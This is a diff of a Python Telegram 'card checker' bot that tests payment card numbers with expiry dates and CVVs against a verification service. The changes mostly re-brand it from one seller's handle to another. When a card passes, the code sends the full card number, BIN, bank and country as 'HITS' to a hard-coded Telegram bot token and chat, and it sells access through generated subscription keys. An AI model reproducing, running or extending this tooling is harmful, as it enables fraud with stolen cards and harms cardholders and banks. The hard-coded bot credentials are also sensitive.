@@ -1052,20 +1052,20 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'success' in last:
 		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 		acc =  '-1002246001656'
 		mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ {cc[:6]}
 ｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
@@ -1084,14 +1084,14 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 		acc =  '-1002246001656'
 		mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ {cc[:6]}
 ｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
@@ -1110,14 +1110,14 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 		acc =  '-1002246001656'
 		mg = f"""<b> 
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══» 𝙸𝙽𝙵𝙾 «═══❆
 ｢𝙱𝙸𝙽」➔ {cc[:6]}
 ｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
-❆═══» LAKSHAY'S HITS  «═══❆
+❆═══» NAUGHTY'S HITS  «═══❆
 
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
@@ -1173,7 +1173,7 @@ def start(message):
 			with open('data.json', 'r') as json_file:
 				existing_data = json.load(json_file)
 			characters = string.ascii_uppercase + string.digits
-			pas ='HYPER-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
+			pas ='NAUGHTY-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
 			current_time = datetime.now()
 			ig = current_time + timedelta(hours=h)
 			plan='𝗩𝗜𝗣'
@@ -1195,7 +1195,7 @@ def start(message):
 STATUS ➜ {plan}
 EXPIRES IN ➜ {ig}
 MAGICAL WORDS ➜ <code>{pas}</code>
-UPDATES: @HyperCheckerUpdates
+UPDATES: @Naughtyxd
 		
 𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
 			bot.reply_to(message,msg,parse_mode="HTML")
@@ -1227,8 +1227,8 @@ def respond_to_vbv(message):
 			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
 YOU DO NOT HAVE A ACTIVE SUBSCRIPTION ! {BL}</b>
@@ -1241,8 +1241,8 @@ YOU DO NOT HAVE A ACTIVE SUBSCRIPTION ! {BL}</b>
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>HII {name}
 YOU DO NOT HAVE A ACTIVE SUBSCRIPTION ! {BL}</b>
@@ -1252,8 +1252,8 @@ YOU DO NOT HAVE A ACTIVE SUBSCRIPTION ! {BL}</b>
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/lakshayfr")
-		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/hypermpshop")
+		contact_button = types.InlineKeyboardButton(text="✨ DEV  ✨", url="https://t.me/Naughtyxd")
+		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇", url="https://t.me/Naughtyxd")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>OHH ! IT SEEMS LIKE YOUR SUBSRIPTION HAS EXPIRED.</b>
 	''',reply_markup=keyboard)
@@ -1318,7 +1318,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
 - - - - - - - - - - - - - - - - - - - - - - -
@@ -1330,20 +1330,20 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @lakshayfr
+◆ 𝑩𝒀: @Naughtyxd
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
 		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
 		acc =  '-1002246001656'
 		mg = f"""<b> 
-❆═══lakshay 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
+❆═══NAUGHTY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
 ｢𝙲𝙲」➔ <code>{cc}</code>
 ❆═══𝙸𝙽𝙵𝙾═══❆
 ｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
 ｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
-❆═══LAKSHAY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
+❆═══NAUGHTY 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
